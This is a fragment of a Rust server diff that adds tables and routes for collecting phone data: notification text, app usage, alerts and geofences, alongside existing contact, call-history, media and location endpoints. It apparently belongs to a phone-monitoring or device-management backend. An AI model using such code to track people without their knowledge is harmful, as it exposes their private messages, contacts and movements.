+        })).collect::<Vec<_>>(),
+        "app_usage": app_usage.into_iter().map(|row| serde_json::json!({
+            "id": row.get::<i32, _>("id"),
+            "package_name": row.get::<String, _>("package_name"),
+            "app_name": row.get::<String, _>("app_name"),
+            "total_time_foreground_ms": row.get::<i64, _>("total_time_foreground_ms"),
+            "last_time_used_ms": row.get::<i64, _>("last_time_used_ms")
+        })).collect::<Vec<_>>(),
+        "notifications": notifications.into_iter().map(|row| serde_json::json!({
+            "id": row.get::<i32, _>("id"),
+            "package_name": row.get::<Option<String>, _>("package_name"),
+            "app_name": row.get::<Option<String>, _>("app_name"),
+            "title": row.get::<Option<String>, _>("title"),
+            "text": row.get::<Option<String>, _>("text"),
+            "post_time_ms": row.get::<i64, _>("post_time_ms")
+        })).collect::<Vec<_>>(),
         "contacts": contacts.into_iter().map(|row| serde_json::json!({
             "id": row.get::<i32, _>("id"),
             "name": row.get::<Option<String>, _>("name"),
@@ -1539,6 +2112,76 @@ async fn main() // this mark the pogram entry point and enable aync rust using t
     .await
     .expect("Failed to ensure device call-history table");
 
+    sqlx::query(
+        "
+        CREATE TABLE IF NOT EXISTS device_notifications (
+            id SERIAL PRIMARY KEY,
+            device_id TEXT NOT NULL,
+            package_name TEXT,
+            app_name TEXT,
+            title TEXT,
+            text TEXT,
+            post_time_ms BIGINT NOT NULL,
+            created_at TIMESTAMP NOT NULL DEFAULT NOW()
+        )
+        ",
+    )
+    .execute(&db)
+    .await
+    .expect("Failed to ensure device notifications table");
+
+    sqlx::query(
+        "
+        CREATE TABLE IF NOT EXISTS device_alerts (
+            id SERIAL PRIMARY KEY,
+            device_id TEXT NOT NULL,
+            alert_type TEXT NOT NULL,
+            severity TEXT NOT NULL DEFAULT 'info',
+            title TEXT NOT NULL,
+            message TEXT NOT NULL,
+            created_at TIMESTAMP NOT NULL DEFAULT NOW()
+        )
+        ",
+    )
+    .execute(&db)
+    .await
+    .expect("Failed to ensure device alerts table");
+
+    sqlx::query(
+        "
+        CREATE TABLE IF NOT EXISTS device_geofences (
+            id SERIAL PRIMARY KEY,
+            device_id TEXT NOT NULL,
+            name TEXT NOT NULL,
+            latitude DOUBLE PRECISION NOT NULL,
+            longitude DOUBLE PRECISION NOT NULL,
+            radius_meters DOUBLE PRECISION NOT NULL,
+            is_active BOOLEAN NOT NULL DEFAULT TRUE,
+            created_at TIMESTAMP NOT NULL DEFAULT NOW()
+        )
+        ",
+    )
+    .execute(&db)
+    .await
+    .expect("Failed to ensure device geofences table");
+
+    sqlx::query(
+        "
+        CREATE TABLE IF NOT EXISTS device_app_usage (
+            id SERIAL PRIMARY KEY,
+            device_id TEXT NOT NULL,
+            package_name TEXT NOT NULL,
+            app_name TEXT NOT NULL,
+            total_time_foreground_ms BIGINT NOT NULL,
+            last_time_used_ms BIGINT NOT NULL,
+            created_at TIMESTAMP NOT NULL DEFAULT NOW()
+        )
+        ",
+    )
+    .execute(&db)
+    .await
+    .expect("Failed to ensure device app usage table");
+
     let state = AppState { db }; //Stores the DB pool in app State
 
     let app = Router::new() //creates the HTTP router
@@ -1554,6 +2197,13 @@ async fn main() // this mark the pogram entry point and enable aync rust using t
         .route("/devices/phone-details", post(update_phone_details))
         .route("/devices/contacts", post(upload_contacts))
         .route("/devices/call-history", post(upload_call_history))
+        .route("/devices/notifications", post(upload_notifications))
+        .route("/devices/alerts", post(upload_device_alert))
+        .route("/devices/geofences/event", post(upload_geofence_event))
+        .route("/devices/{device_id}/geofences", post(create_geofence).get(list_geofences))
+        .route("/devices/{device_id}/geofences-query", post(query_geofences))
+        .route("/devices/{device_id}/geofences/{id}", delete(delete_geofence))
+        .route("/devices/app-usage", post(upload_app_usage))
         .route("/devices/media", post(upload_media))
         .route("/devices/{device_id}/details", get(device_details_page))
         .route("/devices/{device_id}/details-data", get(device_details_data))
@@ -1568,6 +2218,18 @@ async fn main() // this mark the pogram entry point and enable aync rust using t
         .route(
             "/devices/{device_id}/details/media/{id}",
             delete(delete_detail_media),
+        )
+        .route(
+            "/devices/{device_id}/details/notifications/{id}",
+            delete(delete_detail_notification),
+        )
+        .route(
+            "/devices/{device_id}/details/alerts/{id}",
+            delete(delete_detail_alert),
+        )
+        .route(
+            "/devices/{device_id}/details/app-usage/{id}",
+            delete(delete_detail_app_usage),
         )
         .route(
             "/devices/{device_id}/locate",
